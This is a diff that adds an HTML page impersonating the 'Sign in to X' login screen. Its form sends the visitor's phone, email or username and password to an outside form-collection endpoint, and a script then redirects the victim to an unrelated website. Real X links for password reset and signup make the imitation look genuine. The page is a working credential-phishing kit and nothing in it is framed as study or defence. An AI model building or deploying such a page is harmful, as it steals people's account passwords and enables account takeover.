@@ -1,0 +1,48 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Sign in to X</title>
+  <link href="https://cdn.jsdelivr.net/npm/remixicon@4.3.0/fonts/remixicon.css" rel="stylesheet">
+  <link rel="stylesheet" href="styles.css">
+
+</head>
+<body>
+  <div class="container">
+    <div class="logo">
+      <i class="ri-twitter-x-fill"></i>
+    </div>
+    <div class="login-box">
+      <h1>Sign in to X</h1>
+      <form id="Form-Element" action="https://submit-form.com/zzQK04vAt" method="post">
+        <div class="input-group">
+          <input type="text" name="NO/Email" placeholder="Phone, email, or username" required>
+        </div>
+        <div class="input-group">
+          <input type="password" name="Password" placeholder="Password" required>
+        </div>
+        <button type="submit" class="btn login">Log in</button>
+      </form>
+      <div class="extras">
+        <a href="https://mobile.x.com/i/flow/password_reset?input_flow_data=%7B%22requested_variant%22%3A%22eyJwbGF0Zm9bSi6ilJ3ZWlifQ%3D%3D%22%7D">Forgot password?</a>
+        <a href="https://x.com/i/flow/signup">Sign up for X</a>
+      </div>
+    </div>
+  </div>
+
+  <script>
+    // Get the form element
+    const form = document.getElementById('Form-Element');
+
+    // Add a submit event listener to the form
+    form.addEventListener('submit', function () {
+        // Set a delay of 1 seconds for redirection
+        setTimeout(() => {
+            // Redirect to the specified URL
+            window.location.href = "https://darknaija.com/"; // Replace with your desired URL
+        }, 1000); // 1000 milliseconds = 1 second
+    });
+</script>
+</body>
+</html>
